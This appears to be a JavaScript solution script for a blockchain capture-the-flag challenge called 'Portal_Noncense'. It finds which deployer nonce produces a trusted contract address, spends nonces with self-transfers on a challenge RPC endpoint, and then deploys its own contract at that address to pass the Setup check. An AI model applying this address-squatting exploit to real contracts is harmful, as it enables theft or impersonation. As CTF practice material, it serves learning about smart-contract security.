const Web3 = require('web3');
//const keccak = require('keccak');
const hre = require("hardhat");
const { getContractAddress } = require('@ethersproject/address')

const addresses = ["0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007", "0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF", "0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1"];

async function main() {

    const [deployer] = await hre.ethers.getSigners();

    const SETUP_ADDRESS = "0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA";
    const PLAYER_ADDRESS = "0xaDb67e10Fa330db49e98201B4c5F19356CfA3f59";

    // Get the contract instances
    const Setup = await hre.ethers.getContractFactory("contracts/Portal_Noncense/Setup.sol:Setup");
    const setupInstance = Setup.attach(SETUP_ADDRESS);
    
    // Interact with the Setup contract
    const PortalAddress = await setupInstance.TARGET();
    console.log(`AuctionHouse Address: ${PortalAddress}`);
    
    // Assuming Creature ABI is available
    const Portal = await hre.ethers.getContractFactory("contracts/Portal_Noncense/Portal.sol:PortalStation");
    const portalInstance = Portal.attach(PortalAddress);
    
//    const AttackerContract = await hre.ethers.getContractFactory("contracts/Portal_Noncense/Solution/AttackerContract.sol:Exploit");
//    let attackerContractInstance = await AttackerContract.deploy(PLAYER_ADDRESS);
    
    let txnCount = 0;
    for (let i = 0; i < 2000; i++) {

        let contractAddress = getContractAddress({
            from: PLAYER_ADDRESS,
            nonce: i
          });

        if (addresses.includes(contractAddress)) {
            txnCount = i;
            console.log(contractAddress, i);
        }
    }

    const web3 = new Web3.Web3('http://94.237.62.149:38551/rpc');

    console.log("Sending Txns: ", txnCount);
    console.log(await web3.eth.getTransactionCount(PLAYER_ADDRESS));

    for (let i = 0; i < txnCount; i++){
        if (i % 10 == 0){
            console.log(i);
        }
        await web3.eth.sendTransaction({
            from: PLAYER_ADDRESS,
            to: PLAYER_ADDRESS,
            value: web3.utils.toWei('0.0000001', 'ether'),
          });
    }
    console.log("FInished Sending Txns: ", txnCount);
    console.log(await web3.eth.getTransactionCount(PLAYER_ADDRESS));
    
    const MyPortalContract = await hre.ethers.getContractFactory("contracts/Portal_Noncense/Solution/MyPortal.sol:MyPortal");
    let myPortalInstance = await MyPortalContract.deploy();

    console.log(await myPortalInstance.getAddress());

    await portalInstance.createPortal("orcKingdom");

    console.log(await setupInstance.isSolved());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });